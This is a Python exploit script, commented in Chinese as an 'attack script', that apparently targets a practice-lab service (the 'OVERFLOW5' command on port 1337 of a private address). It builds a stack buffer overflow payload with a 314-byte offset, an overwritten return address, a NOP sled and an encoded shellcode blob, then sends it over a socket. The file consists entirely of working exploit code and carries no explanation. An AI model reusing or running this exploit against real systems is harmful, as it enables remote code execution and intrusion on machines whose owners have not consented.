#coding=utf-8
#!/usr/bin/python

#攻击脚本

import socket

ip = "10.10.179.114"
port = 1337

prefix = "OVERFLOW5 "
offset = 314 
overflow = "A" * offset
retn = "\xbb\x11\x50\x62"

padding = "\x90" * 16

buf = ""
buf+="\xfc\xbb\x6d\x19\x0f\xc1\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
buf+="\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x91\xf1\x8d\xc1\x69"
buf+="\x02\xf2\x48\x8c\x33\x32\x2e\xc5\x64\x82\x24\x8b\x88\x69\x68"
buf+="\x3f\x1a\x1f\xa5\x30\xab\xaa\x93\x7f\x2c\x86\xe0\x1e\xae\xd5"
buf+="\x34\xc0\x8f\x15\x49\x01\xd7\x48\xa0\x53\x80\x07\x17\x43\xa5"
buf+="\x52\xa4\xe8\xf5\x73\xac\x0d\x4d\x75\x9d\x80\xc5\x2c\x3d\x23"
buf+="\x09\x45\x74\x3b\x4e\x60\xce\xb0\xa4\x1e\xd1\x10\xf5\xdf\x7e"
buf+="\x5d\x39\x12\x7e\x9a\xfe\xcd\xf5\xd2\xfc\x70\x0e\x21\x7e\xaf"
buf+="\x9b\xb1\xd8\x24\x3b\x1d\xd8\xe9\xda\xd6\xd6\x46\xa8\xb0\xfa"
buf+="\x59\x7d\xcb\x07\xd1\x80\x1b\x8e\xa1\xa6\xbf\xca\x72\xc6\xe6"
buf+="\xb6\xd5\xf7\xf8\x18\x89\x5d\x73\xb4\xde\xef\xde\xd1\x13\xc2"
buf+="\xe0\x21\x3c\x55\x93\x13\xe3\xcd\x3b\x18\x6c\xc8\xbc\x5f\x47"
buf+="\xac\x52\x9e\x68\xcd\x7b\x65\x3c\x9d\x13\x4c\x3d\x76\xe3\x71"
buf+="\xe8\xd9\xb3\xdd\x43\x9a\x63\x9e\x33\x72\x69\x11\x6b\x62\x92"
buf+="\xfb\x04\x09\x69\x6c\x21\xdf\x78\xb6\x5d\xdd\x7a\x57\xc2\x68"
buf+="\x9c\x3d\xea\x3c\x37\xaa\x93\x64\xc3\x4b\x5b\xb3\xae\x4c\xd7"
buf+="\x30\x4f\x02\x10\x3c\x43\xf3\xd0\x0b\x39\x52\xee\xa1\x55\x38"
buf+="\x7d\x2e\xa5\x37\x9e\xf9\xf2\x10\x50\xf0\x96\x8c\xcb\xaa\x84"
buf+="\x4c\x8d\x95\x0c\x8b\x6e\x1b\x8d\x5e\xca\x3f\x9d\xa6\xd3\x7b"
buf+="\xc9\x76\x82\xd5\xa7\x30\x7c\x94\x11\xeb\xd3\x7e\xf5\x6a\x18"
buf+="\x41\x83\x72\x75\x37\x6b\xc2\x20\x0e\x94\xeb\xa4\x86\xed\x11"
buf+="\x55\x68\x24\x92\x75\x8b\xec\xef\x1d\x12\x65\x52\x40\xa5\x50"
buf+="\x91\x7d\x26\x50\x6a\x7a\x36\x11\x6f\xc6\xf0\xca\x1d\x57\x95"
buf+="\xec\xb2\x58\xbc\xec\x34\xa7\x3f";

payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

